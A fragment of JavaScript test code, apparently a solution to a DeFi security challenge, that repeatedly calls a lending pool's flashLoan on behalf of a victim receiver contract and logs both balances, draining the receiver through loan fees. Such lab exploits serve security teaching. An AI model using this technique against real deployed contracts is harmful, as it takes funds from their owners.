    ...
    for (let i = 0; i < 10; i++) {
      await pool
        ...
        .flashLoan(
          receiver.address,
          await pool.ETH(),
          ETHER_IN_RECEIVER - 10n ** 18n,
          "0x"
        );
      console.log(
        "Pool balance after flash loan:",
        ethers.utils.formatEther(await ethers.provider.getBalance(pool.address))
      );
      console.log(
        "Receiver balance after flash loan:",
        ethers.utils.formatEther(
          await ethers.provider.getBalance(receiver.address)
        )
      );
